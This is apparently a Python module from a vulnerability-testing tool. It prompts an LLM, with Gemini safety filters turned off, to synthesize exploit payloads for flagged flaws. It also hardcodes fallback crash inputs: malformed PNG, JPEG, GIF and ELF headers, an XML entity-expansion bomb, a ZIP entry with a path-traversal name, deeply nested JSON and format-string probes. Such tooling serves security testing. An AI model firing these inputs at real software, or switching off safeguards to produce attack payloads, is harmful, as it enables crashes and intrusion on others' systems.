import json
import re
import struct
import zlib

from pydantic import BaseModel, Field

from mutagen.agents.base import BaseAgent
from mutagen.agents.prompts import get_synthesizer_rules
from mutagen.binary_repair import repair_binary_payload
from mutagen.constants import (
    DEFAULT_GEMINI_FALLBACK_MODELS,
    DEFAULT_MODEL_GEMINI,
    DEFAULT_PROVIDER,
    SYNTHESIZER_TEMPERATURE,
)
from mutagen.engines import get_engine
from mutagen.safety import GEMINI_SAFETY_OFF
from mutagen.state import CrashPayload, ProgramContext


class PayloadList(BaseModel):
    class PayloadItem(BaseModel):
        args: list[str] = Field(default_factory=list)
        input_data: str = ""
        raw_bytes_hex: str | None = None
        reason: str = ""
    payloads: list[PayloadItem]

def robust_json_parse(raw: str) -> dict:
    """Sanitizes raw LLM output, strips markdown, handles unescaped control chars/trailing commas, and uses regex/array fallbacks."""
    if not raw or not raw.strip():
        return {"payloads": [{"args": [], "input_data": "", "raw_bytes_hex": None, "reason": "Fallback due to empty response"}]}

    cleaned = raw.strip()
    # Strip markdown block wrappers (```json ... ``` or ``` ...)
    if cleaned.startswith("```"):
        parts = cleaned.split("```")
        cleaned = parts[1] if len(parts) > 1 else cleaned
        if cleaned.startswith("json"):
            cleaned = cleaned[4:]
        cleaned = cleaned.strip()

    # Attempt 1: Direct json.loads
    try:
        data = json.loads(cleaned)
        if isinstance(data, dict):
            return data
        if isinstance(data, list):
            return {"payloads": [x for x in data if isinstance(x, dict)]}
    except Exception:
        pass

    # Attempt 2: Strict=False for raw newlines/tabs inside string literals
    try:
        data = json.loads(cleaned, strict=False)
        if isinstance(data, dict):
            return data
        if isinstance(data, list):
            return {"payloads": [x for x in data if isinstance(x, dict)]}
    except Exception:
        pass

    # Attempt 3: Fix common trailing commas before closing braces/brackets
    fixed_syntax = re.sub(r',\s*([\]}])', r'\1', cleaned)
    try:
        data = json.loads(fixed_syntax, strict=False)
        if isinstance(data, dict):
            return data
        if isinstance(data, list):
            return {"payloads": [x for x in data if isinstance(x, dict)]}
    except Exception:
        pass

    # Attempt 4: Use centralized output_parser extract_json_array
    from mutagen.engines.output_parser import extract_json_array
    extracted_items = extract_json_array(cleaned)
    if extracted_items:
        return {"payloads": extracted_items}

    # Attempt 5: Regex match for outermost JSON object { ... }
    match = re.search(r'\{.*\}', cleaned, re.DOTALL)
    if match:
        try:
            data = json.loads(match.group(0), strict=False)
            if isinstance(data, dict):
                return data
        except Exception:
            pass

    # Fallback default dict — generate format-aware binary payloads for file mode
    return {"payloads": [{"args": [], "input_data": "", "raw_bytes_hex": None, "reason": "Fallback due to JSON parse error"}]}


def _generate_file_mode_fallback_payloads(target_path: str = "", source_code: str = "") -> list[dict]:
    """Generate universal format-aware binary and structured fallback payloads.
    Detects target domain (images, PDFs, archives, ELF/PE, JSON, XML, audio, media, generic binary)
    and constructs targeted boundary-breaking structures."""
    payloads = []
    t_lower = (target_path + " " + source_code[:1000]).lower()

    # 1. Image Targets (PNG, JPEG, GIF, WebP, BMP, TIFF)
    if any(k in t_lower for k in ["png", "palette", "plte", "ihdr", "idat"]):
        png_sig = b'\x89PNG\r\n\x1a\n'
        ihdr_data = struct.pack('>II', 0xFFFFFFFF, 0xFFFFFFFF) + b'\x08\x02\x00\x00\x00'
        ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data
        # Palette over-read trigger (10 colors in PLTE, pixel index referencing out of bounds)
        plte_data = b'\x00\x00\x00' * 10
        plte_chunk = struct.pack('>I', len(plte_data)) + b'PLTE' + plte_data
        idat_raw = zlib.compress(b'\x00\xff\xee\xdd\xcc')
        idat_chunk = struct.pack('>I', len(idat_raw)) + b'IDAT' + idat_raw
        iend_chunk = struct.pack('>I', 0) + b'IEND'
        payloads.append({
            "args": ["overflow_poc.png"], "input_data": "",
            "raw_bytes_hex": (png_sig + ihdr_chunk + plte_chunk + idat_chunk + iend_chunk).hex(),
            "reason": "Universal Fallback: PNG with 10-color PLTE and out-of-bounds palette index (CWE-125/119)"
        })
        payloads.append({
            "args": ["oversized_ihdr.png"], "input_data": "",
            "raw_bytes_hex": (png_sig + ihdr_chunk + iend_chunk).hex(),
            "reason": "Universal Fallback: PNG with 0xFFFFFFFF dimensions (integer overflow / heap allocation)"
        })

    if any(k in t_lower for k in ["jpeg", "jpg", "jfif"]):
        jpeg_sofo = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x60\x00\x60\x00\x00\xff\xc0\x00\x11\x08\xff\xff\xff\xff\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xd9'
        payloads.append({
            "args": ["corrupt_sof.jpg"], "input_data": "",
            "raw_bytes_hex": jpeg_sofo.hex(),
            "reason": "Universal Fallback: JPEG with 0xFFFF dimension markers (buffer overflow)"
        })

    if any(k in t_lower for k in ["gif"]):
        gif_hdr = b'GIF89a\xff\xff\xff\xff\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\xff\xff\xff\xff\x00\x02\x02D\x01\x00;'
        payloads.append({
            "args": ["corrupt_screen.gif"], "input_data": "",
            "raw_bytes_hex": gif_hdr.hex(),
            "reason": "Universal Fallback: GIF with 0xFFFF dimensions and corrupted table (heap over-read)"
        })

    # 2. Document & Structured Data Targets (PDF, JSON, XML, YAML)
    if any(k in t_lower for k in ["pdf"]):
        pdf_payload = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 4096 >>\nstream\n" + (b"A" * 4096) + b"\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000183 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n290\n%%EOF"
        payloads.append({
            "args": ["corrupt_stream.pdf"], "input_data": "",
            "raw_bytes_hex": pdf_payload.hex(),
            "reason": "Universal Fallback: PDF with oversized stream length and corrupted xref table"
        })

    if any(k in t_lower for k in ["json", "cjson", "json-c", "jansson", "yyjson"]):
        nested_json = ("[" * 400) + "1" + ("]" * 400)
        payloads.append({
            "args": ["nested_recursion.json"], "input_data": nested_json,
            "raw_bytes_hex": nested_json.encode("utf-8").hex(),
            "reason": "Universal Fallback: 400-level nested JSON array (call stack overflow recursion)"
        })
        overflow_json = '{"key": "' + ("A" * 8192) + '", "num": 1e999999999999999999999999999999999999999999999999}'
        payloads.append({
            "args": ["overflow_string.json"], "input_data": overflow_json,
            "raw_bytes_hex": overflow_json.encode("utf-8").hex(),
            "reason": "Universal Fallback: 8KB string + huge exponent float (string buffer overflow & float parse overflow)"
        })

    if any(k in t_lower for k in ["xml", "libxml", "expat", "pugixml", "tinyxml"]):
        billion_laughs = '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><root>&c;&c;&c;&c;&c;&c;&c;&c;</root>'
        payloads.append({
            "args": ["entity_expansion.xml"], "input_data": billion_laughs,
            "raw_bytes_hex": billion_laughs.encode("utf-8").hex(),
            "reason": "Universal Fallback: XML quadratic entity expansion (memory exhaustion / buffer overflow)"
        })

    # 3. Archive & Executable Targets (ZIP, TAR, GZ, ELF)
    if any(k in t_lower for k in ["zip", "unzip", "archive", "miniz", "zlib"]):
        zip_hdr = b'PK\x03\x04\x14\x00\x00\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x1c\x00\x00\x00../../../../../../../../tmp/pwn' + (b'A' * 512)
        payloads.append({
            "args": ["traversal_overflow.zip"], "input_data": "",
            "raw_bytes_hex": zip_hdr.hex(),
            "reason": "Universal Fallback: ZIP header with 0xFFFFFFFF sizes and directory traversal path"
        })

    if any(k in t_lower for k in ["elf", "binary", "exec", "loader"]):
        elf_corrupt = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00@\x008\x00\x01\x00@\x00\xff\xff\x00\x00'
        payloads.append({
            "args": ["corrupt_header.elf"], "input_data": "",
            "raw_bytes_hex": elf_corrupt.hex(),
            "reason": "Universal Fallback: 64-bit ELF with 0xFFFFFFFFFFFFFFFF section offset and 0xFFFF section count"
        })

    # 4. Universal Generic Binary Fuzz Probes (Always appended to guarantee baseline coverage)
    payloads.append({
        "args": ["heap_spray_8kb.bin"], "input_data": "A" * 8192,
        "raw_bytes_hex": (b'A' * 8192).hex(),
        "reason": "Universal Fallback: 8KB contiguous ASCII memory spray (heap/stack overflow)"
    })
    payloads.append({
        "args": ["boundary_probe.bin"], "input_data": "",
        "raw_bytes_hex": (b'\x00' * 256 + b'\xff' * 256 + b'\x7f\xff\xff\xff\x80\x00\x00\x00').hex(),
        "reason": "Universal Fallback: Null-bytes, 0xFF blocks, and 32-bit integer boundaries INT_MAX/INT_MIN"
    })
    payloads.append({
        "args": ["format_string.bin"], "input_data": "%s%p%n%x" * 32,
        "raw_bytes_hex": (b'%s%p%n%x' * 32).hex(),
        "reason": "Universal Fallback: Format string specifiers (%s%p%n%x) to detect unsafe logging"
    })

    return payloads[:6]


def _detect_file_extension(target_path: str = "", source_code: str = "") -> str:
    """Dynamically determines the appropriate file extension for synthesized binary payloads."""
    text = (target_path + " " + source_code[:1000]).lower()
    # Normalize path separators and punctuation to spaces for tokenization
    tokens = set(re.findall(r'[a-z0-9_]+', text))

    ext_map = [
        (["png", "libpng", "ihdr", "plte", "idat"], ".png"),
        (["jpeg", "jpg", "jfif", "libjpeg"], ".jpg"),
        (["gif", "gif89a", "gif87a", "libgif"], ".gif"),
        (["webp", "libwebp"], ".webp"),
        (["bmp"], ".bmp"),
        (["tiff", "tif", "libtiff"], ".tiff"),
        (["svg"], ".svg"),
        (["pdf", "libpdf", "mupdf", "pdfium"], ".pdf"),
        (["zip", "unzip", "miniz", "libzip"], ".zip"),
        (["tar", "untar", "libarchive"], ".tar"),
        (["gzip", "gz", "zlib"], ".gz"),
        (["json", "cjson", "yyjson", "jansson"], ".json"),
        (["xml", "libxml", "expat", "pugixml"], ".xml"),
        (["yaml", "yml", "libyaml"], ".yaml"),
        (["sqlite", "sqlite3"], ".db"),
        (["wav", "wave"], ".wav"),
        (["mp3"], ".mp3"),
        (["mp4"], ".mp4"),
        (["elf"], ".elf"),
    ]
    for keywords, ext in ext_map:
        for k in keywords:
            if k in tokens or any(t.startswith(k) or t.endswith(k) for t in tokens if len(t) > len(k) and "target" not in t):
                return ext
    return ".bin"


class PayloadSynthesizerAgent(BaseAgent):
    def __init__(self, model_provider: str = DEFAULT_PROVIDER, model_name: str = DEFAULT_MODEL_GEMINI, api_key: str = None):
        super().__init__("Payload Synthesizer Agent", model_provider, model_name, api_key)
        self.engine = get_engine(model_provider, self.api_key, model_name)

    async def process(self, context: ProgramContext) -> ProgramContext:
        self.engine.language = context.language
        context.logs.append("[PayloadSynthesizerAgent] Synthesizing exploit payloads based on triage...")

        if not context.vulnerabilities:
            context.logs.append("[PayloadSynthesizerAgent] No vulnerabilities to synthesize payloads for.")
            return context

        candidate_vulns = context.vulnerabilities
        if getattr(context, "skip_flagged_findings", False):
            candidate_vulns = [v for v in context.vulnerabilities if not (v.is_false_positive_risk or v.confidence == "LOW" or v.verification_status in ("LIKELY_FALSE_POSITIVE", "UNGROUNDED_FINDING"))]
            if not candidate_vulns:
                context.logs.append(f"[PayloadSynthesizerAgent] Skipping payload synthesis: all {len(context.vulnerabilities)} finding(s) flagged as likely false positive / ungrounded (--skip-flagged-findings enabled).")
                return context

        # Query Token-Efficient Vulnerability Intelligence Engine (Single Highest-Impact Signature)
        from mutagen.intelligence import get_token_efficient_signature
        intel_hints = []
        for v in candidate_vulns[:2]:
            intel = get_token_efficient_signature(v.cwe, v.vuln_type)
            hint_str = f"Signature [{intel['selected_cwe']}] (CVSS {intel['cvss_score']} {intel['severity']}): {intel['signature_hint']}"
            intel_hints.append(hint_str)
            context.notepad.append(f"[Intelligence] {hint_str}")

        vuln_descriptions = []
        for v in candidate_vulns:
            v_annot_note = ""
            if v.is_false_positive_risk or v.confidence == "LOW":
                v_annot_note = f" [VERIFICATION NOTE: Flagged {v.verification_status} - {v.verification_annotation}]"
            vuln_descriptions.append(
                f"- {v.vuln_type} at line {v.line_number} ({v.cwe}){v_annot_note}: {v.metadata.get('reason', '')}"
            )

        joined_vuln_desc = "\n".join(vuln_descriptions)
        lang_rules = get_synthesizer_rules(context.language)
        poc_context_str = ("\nVulnerability Signature Intelligence:\n" + "\n".join(intel_hints)) if intel_hints else ""

        # Build token-efficient surgical source code context
        scoped_source = context.source_code
        if len(context.source_code.splitlines()) > 300:
            lines = context.source_code.splitlines()
            preamble = "\n".join(lines[:30])
            extracted_snippets = [f"// Preamble:\n{preamble}\n"]
            seen_scopes = set()
            for v in candidate_vulns[:3]:
                window_start = max(0, v.line_number - 30)
                window_end = min(len(lines), v.line_number + 30)
                window_key = (window_start, window_end)
                if window_key not in seen_scopes:
                    seen_scopes.add(window_key)
                    snip = "\n".join(lines[window_start:window_end])
                    extracted_snippets.append(f"// Target context around Line {v.line_number} ({v.vuln_type}):\n{snip}\n")
            scoped_source = "\n".join(extracted_snippets)

        cve_meta = getattr(context, "cve_meta", None)
        cve_spec_str = ""
        if cve_meta:
            cve_spec_str = (
                f"\nGround-Truth CVE Target Specification:\n"
                f"- Target CVE: {cve_meta.get('cve_id')} ({cve_meta.get('name')})\n"
                f"- Flaw Type: {cve_meta.get('vuln_type')} ({cve_meta.get('cwe')})\n"
                f"- Affected Function(s): {', '.join(cve_meta.get('affected_functions', []))}\n"
                f"- PoC Synthesis Guidance: {cve_meta.get('poc_guidance', '')}\n"
            )

        prompt = f"""You are an elite automated exploit payload generation engineer.
Objective:
Synthesize exact input payloads (arguments, byte buffers, or files) engineered to reproduce identified security flaws.

Target Vulnerabilities:
{joined_vuln_desc}
{cve_spec_str}
{poc_context_str}

Source Code Context:
{scoped_source}

Payload Generation Guidelines:
1. Delivery Mode Alignment:
   - For 'file' delivery mode: Supply raw binary byte streams as hex strings in 'raw_bytes_hex' (e.g. "89504e470d0a1a0a..."). Provide target filename in 'args' (e.g. ["overflow_poc.png"]).
   - For 'args' delivery mode: Supply target argument arrays in 'args' (do not prepend target executable name).
   - For 'stdin' / 'tcp' / 'http' delivery modes: Supply payload strings in 'input_data'.
2. Structural Integrity:
   - Ensure all JSON string fields are valid, single-line text without unescaped control characters.
   - For buffer overflows and heap allocation bugs, craft binary boundaries or hex byte streams necessary to exceed target allocations.
{lang_rules}

Required Schema:
Return JSON adhering strictly to:
{{
  "payloads": [
    {{
      "args": ["overflow_poc.png"],
      "input_data": "",
      "raw_bytes_hex": "89504e47...",
      "reason": "Technical rationale explaining payload structure"
    }}
  ]
}}
"""

        try:
            data = None
            synthesis_error = None
            if self.model_provider == "gemini" and hasattr(self.engine, "client") and hasattr(self.engine.client, "models"):
                from rich.console import Console

                from mutagen.engines.base import AiActivityHeartbeat
                console = Console(force_terminal=True, force_jupyter=False)

                models_to_try = [self.model_name] if self.model_name else []
                for m in DEFAULT_GEMINI_FALLBACK_MODELS:
                    if m not in models_to_try:
                        models_to_try.append(m)

                for model_candidate in models_to_try:
                    for attempt in range(2):
                        try:
                            with AiActivityHeartbeat(task_name=f"synthesizing exploit payloads with {model_candidate}"):
                                response = self.engine.client.models.generate_content(
                                    model=model_candidate,
                                    contents=prompt,
                                    config={
                                        "temperature": SYNTHESIZER_TEMPERATURE,
                                        "response_mime_type": "application/json",
                                        "response_schema": PayloadList,
                                        "safety_settings": GEMINI_SAFETY_OFF,
                                    }
                                )
                            raw_response_text = response.text if response else ""
                            if not raw_response_text or not raw_response_text.strip():
                                raise ValueError("Empty response text from AI model")
                            parsed = robust_json_parse(raw_response_text)
                            if parsed and parsed.get("payloads") and not (len(parsed["payloads"]) == 1 and "Fallback" in parsed["payloads"][0].get("reason", "")):
                                data = parsed
                                break
                        except Exception as e:
                            synthesis_error = e
                            err_upper = str(e).upper()
                            if "429" in err_upper or "RESOURCE_EXHAUSTED" in err_upper:
                                import time
                                console.print("[yellow]  Rate limit (429) on synthesis. Waiting 15s to cool down...[/yellow]")
                                time.sleep(15)
                            elif any(k in err_upper for k in ["504", "TIMEOUT", "503", "SERVER_ERROR", "DEADLINE_EXCEEDED", "NOT_FOUND", "404"]):
                                console.print(f"[yellow]  Model '{model_candidate}' timed out (504/timeout). Switching to fallback model candidate...[/yellow]")
                                break
                            elif attempt < 1:
                                import time
                                time.sleep(2)
                    if data is not None and data.get("payloads"):
                        break

                if data is None:
                    context.synthesis_failed = True
                    context.synthesis_error = f"{type(synthesis_error).__name__}: {synthesis_error}" if synthesis_error else "Empty response"
                    context.logs.append(f"[PayloadSynthesizerAgent] WARNING: Real payload synthesis failed ({context.synthesis_error}). Activating format fallback...")
                    if context.delivery_mode == "file":
                        data = {"payloads": _generate_file_mode_fallback_payloads(context.target_path or "", context.source_code or "")}
                    else:
                        data = {"payloads": [{"args": ["A" * 64], "input_data": "A" * 64, "reason": "Generic fallback payload (synthesis failed)", "is_fallback": True}]}
            else:
                # Multi-provider fallback for OpenAI, Claude, and Ollama
                raw_payloads = self.engine.generate_payloads(context.source_code, prompt, max_payloads=5, debug=False)
                payload_items = []
                for item in raw_payloads:
                    if isinstance(item, dict):
                        payload_items.append({
                            "args": item.get("args", []),
                            "input_data": item.get("input_data", ""),
                            "raw_bytes_hex": item.get("raw_bytes_hex"),
                            "reason": item.get("reason", "Synthesized by AI swarm")
                        })
                    elif isinstance(item, str):
                        payload_items.append({
                            "args": [item],
                            "input_data": item,
                            "raw_bytes_hex": None,
                            "reason": "Synthesized string payload"
                        })
                data = {"payloads": payload_items}

            payloads = data.get("payloads", [])
            valid_payloads_added = 0
            is_synthesis_fallback = getattr(context, "synthesis_failed", False)

            for p in payloads:
                args = p.get("args", [])
                input_data = p.get("input_data", "")
                raw_bytes_hex = p.get("raw_bytes_hex")
                reason = p.get("reason", "")
                item_is_fallback = bool(p.get("is_fallback", is_synthesis_fallback) or "Fallback" in reason)

                # SYSTEMIC VALIDATION & FALLBACK RECOVERY:
                is_empty_payload = (not args or len(args) == 0) and (not input_data or not str(input_data).strip()) and not raw_bytes_hex
                target_ext = _detect_file_extension(context.target_path or "", context.source_code or "")
                if is_empty_payload:
                    item_is_fallback = True
                    context.logs.append(f"[PayloadSynthesizerAgent] WARNING: Payload produced reasoning without args/input_data (Reason: {reason}). Auto-recovering payload...")
                    if context.delivery_mode == "file":
                        args = [f"overflow_poc{target_ext}"]
                        fb_payloads = _generate_file_mode_fallback_payloads(context.target_path or "", context.source_code or "")
                        raw_bytes_hex = fb_payloads[0]["raw_bytes_hex"] if fb_payloads else None
                    elif context.delivery_mode == "args":
                        args = ["A" * 64]
                    else:
                        input_data = "A" * 64
                elif context.delivery_mode == "file" and (not args or len(args) == 0):
                    args = [f"payload_poc_{valid_payloads_added+1}{target_ext}"]
                    context.logs.append(f"[PayloadSynthesizerAgent] Info: Auto-populated missing args filename ({args[0]}) for file delivery mode.")

                # Dynamic Post-Synthesis Binary & Kernel Header Repair Pass
                if raw_bytes_hex:
                    try:
                        repaired_bytes = repair_binary_payload(bytes.fromhex(raw_bytes_hex), target_hint=context.target_path)
                        raw_bytes_hex = repaired_bytes.hex()
                    except Exception:
                        pass
                elif input_data and context.delivery_mode == "file":
                    try:
                        repaired_bytes = repair_binary_payload(input_data, target_hint=context.target_path)
                        raw_bytes_hex = repaired_bytes.hex()
                    except Exception:
                        pass

                context.add_payload({
                    "args": args,
                    "input_data": input_data,
                    "raw_bytes_hex": raw_bytes_hex,
                    "reason": reason,
                    "is_fallback": item_is_fallback,
                    "synthesis_failed": is_synthesis_fallback,
                })
                valid_payloads_added += 1
                context.logs.append(f"[PayloadSynthesizerAgent] Generated payload args: {args} (Fallback: {item_is_fallback}, Reason: {reason})")

            # For file delivery mode, append format-aware structural binary fallback payloads
            if context.delivery_mode == "file" and not is_synthesis_fallback:
                target_ext = _detect_file_extension(context.target_path or "", context.source_code or "")
                for i, fb in enumerate(_generate_file_mode_fallback_payloads(context.target_path or "", context.source_code or "")):
                    context.add_payload({
                        "args": [f"payload_fallback_{i+1}{target_ext}"],
                        "input_data": "",
                        "raw_bytes_hex": fb["raw_bytes_hex"],
                        "reason": fb["reason"],
                        "is_fallback": True,
                        "synthesis_failed": False,
                    })
                    valid_payloads_added += 1

            # Final safety check: if active_payloads remains empty, insert fallback
            if valid_payloads_added == 0:
                context.synthesis_failed = True
                context.logs.append("[PayloadSynthesizerAgent] WARNING: Zero payloads generated by synthesis. Inserting format fallback...")
                target_ext = _detect_file_extension(context.target_path or "", context.source_code or "")
                if context.delivery_mode == "file":
                    for fb in _generate_file_mode_fallback_payloads(context.target_path or "", context.source_code or ""):
                        context.add_payload(CrashPayload(args=[f"poc_fallback{target_ext}"], input_data="", raw_bytes_hex=fb["raw_bytes_hex"], is_fallback=True, synthesis_failed=True))
                else:
                    context.add_payload(CrashPayload(args=["A" * 64], input_data="A" * 64, is_fallback=True, synthesis_failed=True))

        except Exception as e:
            context.synthesis_failed = True
            context.synthesis_error = str(e)
            context.logs.append(f"[PayloadSynthesizerAgent] Error generating payloads: {e}")
            target_ext = _detect_file_extension(getattr(context, "target_path", "") or "", getattr(context, "source_code", "") or "")
            if context.delivery_mode == "file":
                for fb in _generate_file_mode_fallback_payloads(getattr(context, "target_path", "") or "", getattr(context, "source_code", "") or ""):
                    context.add_payload(CrashPayload(args=[f"poc_fallback{target_ext}"], input_data="", raw_bytes_hex=fb["raw_bytes_hex"], is_fallback=True, synthesis_failed=True))
            else:
                context.add_payload(CrashPayload(args=["A" * 64], input_data="A" * 64, reason="Fallback due to execution error", is_fallback=True, synthesis_failed=True))
            context.logs.append("[PayloadSynthesizerAgent] Added safe fallback payload")

        return context
